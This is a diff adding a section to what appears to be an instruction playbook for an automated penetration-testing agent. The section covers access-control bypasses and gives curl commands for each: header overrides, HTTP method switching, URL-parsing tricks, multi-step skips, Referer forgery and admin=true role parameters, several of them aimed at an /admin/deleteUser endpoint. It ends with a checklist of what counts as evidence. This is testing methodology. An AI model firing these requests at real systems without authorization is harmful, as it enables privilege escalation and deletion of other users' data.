@@ -278,6 +278,116 @@ for id in 100 200 500 1000 5000 10000 50000 100000 300000 500000; do
 done
 \`\`\`
 
+## Platform Misconfiguration Bypasses (PortSwigger Best Practice)
+
+When standard IDOR tests fail, try these platform-specific bypass techniques:
+
+### HTTP Header Overrides
+
+Some frameworks support headers that override the original URL path:
+
+\`\`\`bash
+# X-Original-URL bypass
+curl -s -X POST "\$TARGET/" \\
+  -H "Cookie: \$SESSION" \\
+  -H "X-Original-URL: /admin/deleteUser"
+
+# X-Rewrite-URL bypass
+curl -s -X POST "\$TARGET/" \\
+  -H "Cookie: \$SESSION" \\
+  -H "X-Rewrite-URL: /admin/deleteUser"
+\`\`\`
+
+### HTTP Method Manipulation
+
+If one HTTP method is blocked, try others:
+
+\`\`\`bash
+# If POST is blocked, try GET
+curl -s -X GET "\$TARGET/admin/deleteUser?userId=123" -H "Cookie: \$SESSION"
+
+# Try other methods
+for method in GET POST PUT PATCH DELETE HEAD OPTIONS; do
+  curl -s -X \$method "\$TARGET/admin/resource" -H "Cookie: \$SESSION"
+done
+\`\`\`
+
+### URL-Matching Discrepancies
+
+Exploit inconsistencies in URL parsing:
+
+\`\`\`bash
+# Case sensitivity bypass
+curl -s "\$TARGET/ADMIN/DELETEUSER" -H "Cookie: \$SESSION"
+curl -s "\$TARGET/Admin/DeleteUser" -H "Cookie: \$SESSION"
+
+# Trailing slash bypass
+curl -s "\$TARGET/admin/deleteUser/" -H "Cookie: \$SESSION"
+
+# File extension bypass (Spring framework useSuffixPatternMatch)
+curl -s "\$TARGET/admin/deleteUser.json" -H "Cookie: \$SESSION"
+curl -s "\$TARGET/admin/deleteUser.anything" -H "Cookie: \$SESSION"
+
+# Path traversal in URL
+curl -s "\$TARGET/public/../admin/deleteUser" -H "Cookie: \$SESSION"
+\`\`\`
+
+### Multi-Step Process Bypass
+
+Skip early access-controlled steps and go directly to later steps:
+
+\`\`\`bash
+# Step 1 is access-controlled, but step 3 may not be
+# Skip to the final confirmation step with required parameters
+curl -s -X POST "\$TARGET/admin/deleteUser/confirm" \\
+  -H "Cookie: \$SESSION" \\
+  -d "userId=123&confirmed=true"
+\`\`\`
+
+### Referer-Based Access Control Bypass
+
+If access control relies on Referer header:
+
+\`\`\`bash
+# Forge Referer header
+curl -s "\$TARGET/admin/deleteUser" \\
+  -H "Cookie: \$SESSION" \\
+  -H "Referer: \$TARGET/admin/dashboard"
+\`\`\`
+
+### Parameter-Based Role Manipulation
+
+Test for insecure parameter-based role checks:
+
+\`\`\`bash
+# Query parameter manipulation
+curl -s "\$TARGET/profile?admin=true" -H "Cookie: \$SESSION"
+curl -s "\$TARGET/profile?role=admin" -H "Cookie: \$SESSION"
+curl -s "\$TARGET/profile?isAdmin=1" -H "Cookie: \$SESSION"
+
+# Hidden form field in request body
+curl -s -X POST "\$TARGET/updateProfile" \\
+  -H "Cookie: \$SESSION" \\
+  -d "name=test&admin=true"
+\`\`\`
+
+## Evidence Validation Checkpoint
+
+**BEFORE documenting findings, verify you have AT LEAST ONE of:**
+- Access to another user's data WITH PROOF (different user ID, different content)
+- Modification of another user's resource (verified change)
+- Privilege escalation to admin/higher role WITH PROOF
+- Comparison showing own data vs other user's data
+- Platform misconfiguration bypass (header override, method manipulation)
+- Multi-step process bypass (access control skipped on later steps)
+
+**NOT EVIDENCE (do not report these alone):**
+- HTTP 200 on resource request (might be your own resource)
+- Same data returned for different IDs
+- Access to public/unprotected resources
+- Error message mentioning authorization
+- 401/403 without successful bypass (access control is working)
+
 ## CRITICAL: Spawn Crypto Agent for Encryption Errors
 
 If you encounter error messages containing:
